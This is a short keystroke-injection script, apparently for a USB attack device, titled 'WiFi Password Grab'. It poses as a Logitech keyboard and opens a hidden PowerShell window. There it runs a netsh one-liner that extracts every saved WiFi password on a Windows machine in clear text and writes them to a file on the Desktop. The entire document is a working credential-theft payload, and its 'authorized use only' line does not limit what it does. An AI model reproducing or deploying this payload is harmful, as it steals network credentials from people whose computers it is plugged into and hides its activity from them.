REM Title: WiFi Password Grab
REM Author: Community
REM Target: Windows 10/11
REM Description: Exports all saved WiFi passwords to Desktop\wifi_creds.txt
REM AUTHORIZED USE ONLY
REM
ID 046D:C31C Logitech USB Keyboard

DELAY 1500

GUI r
DELAY 600
STRING powershell -WindowStyle Hidden
ENTER
DELAY 1000

STRING $output = @(); (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { $name = ($_ -split ':')[1].Trim(); $pass = (netsh wlan show profile name="$name" key=clear | Select-String 'Key Content'); $output += "SSID: $name`nPassword: $(if($pass){($pass -split ':')[1].Trim()}else{'[None/WPA-Enterprise]'})`n---" }; $output | Out-File "$env:USERPROFILE\Desktop\wifi_creds.txt" -Encoding UTF8; Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Done')
ENTER
DELAY 3000
